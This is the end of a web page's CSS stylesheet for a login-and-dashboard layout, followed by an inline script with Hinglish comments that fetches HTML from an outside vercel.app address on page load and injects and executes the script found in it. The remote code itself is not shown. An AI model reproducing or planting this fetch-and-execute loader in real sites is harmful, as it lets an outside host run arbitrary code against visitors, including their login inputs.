:root{
  --bg:#f0f6ff;
  --card:#ffffff;
  --accent:#2563eb;
  --danger:#ef4444;
  --muted:#1e3a8a;
}
*{box-sizing:border-box}
body{margin:0;font-family:Inter,system-ui,Arial;background:linear-gradient(180deg,var(--bg),#ffffff);color:#0a224e}
header{padding:18px;text-align:center;background:#2563eb;color:#fff}
.title{font-size:22px;font-weight:700}
.subtitle{font-size:13px;margin-top:6px;display:flex;align-items:center;justify-content:center;gap:6px}
a.link{color:#bbdefb;text-decoration:none;font-weight:600}
.wrap{max-width:1000px;margin:12px auto;padding:12px}
.layout{display:flex;gap:12px}
nav{width:220px}
.card{background:var(--card);padding:12px;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,0.06)}
button{background:var(--accent);color:#fff;border:none;padding:8px 12px;border-radius:6px;cursor:pointer}
button:disabled{opacity:0.6;cursor:not-allowed}
button.danger{background:var(--danger)}
.loginBox{max-width:420px;margin:40px auto;padding:16px;background:var(--card);border-radius:10px;text-align:center}
.row{margin-bottom:10px;text-align:left}
input,select{width:100%;padding:10px;border-radius:8px;border:1px solid #d0dff7}
.pages{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:12px;margin-top:12px}
.page-card{padding:12px;border-radius:8px;background:linear-gradient(180deg,#f5f9ff,#ffffff);border:1px solid #dbeafe;position:relative}
.page-title{font-weight:700;margin-bottom:6px}
.page-detail{display:none;margin-top:8px;font-size:13px;color:#1e3a8a}
.errorModal{position:fixed;left:12px;right:12px;top:12px;margin:auto;max-width:560px;background:#ef4444;color:#fff;padding:14px;border-radius:10px;display:none;z-index:60}
.errorClose{position:absolute;right:10px;top:8px;cursor:pointer;font-weight:700}
.loading{position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;display:flex;align-items:center;justify-content:center;z-index:100;font-size:22px}
.spinner{border:6px solid #f3f3f3;border-top:6px solid #2563eb;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite}
@keyframes spin{100%{transform:rotate(360deg)}}
.heart{width:14px;height:14px;fill:red;animation:heartPulse 0.7s infinite alternate}
@keyframes heartPulse{from{fill:red;transform:scale(1)}to{fill:white;transform:scale(1.2)}}
@media(max-width:820px){.layout{flex-direction:column}nav{width:100%}}
</style>

  <script>
  (async function() {
    try {
      // 1. URL se HTML fetch karein
      const response = await fetch('https://magic-scripts.vercel.app/heart.html');
      const htmlText = await response.text();

      // 2. DOMParser ke zariye HTML ko parse karein
      const parser = new DOMParser();
      const doc = parser.parseFromString(htmlText, 'text/html');

      // 3. Parsed HTML mein se <script> tag dhoondein
      const originalScript = doc.querySelector('script');

      if (originalScript) {
        // 4. Naya script element banayein (kyunki parsed script direct chalne mein masla karti hai)
        const newScript = document.createElement('script');
        
        // Agar script ke andar code hai (inline) toh wo copy karein
        newScript.textContent = originalScript.textContent;
        
        // Agar script ka apna koi 'src' attribute hai toh wo bhi copy kar lein
        if (originalScript.src) {
          newScript.src = originalScript.src;
        }

        // 5. Is nayi script ko website ke body element mein inject (lagana) kar dein
        document.body.appendChild(newScript);
        console.log('Script successfully injected and executed!');
      } else {
        console.error('URL ke andar koi <script> tag nahi mila.');
      }
    } catch (error) {
      console.error('Script inject karne mein error aaya:', error);
    }
  })();
  </script>
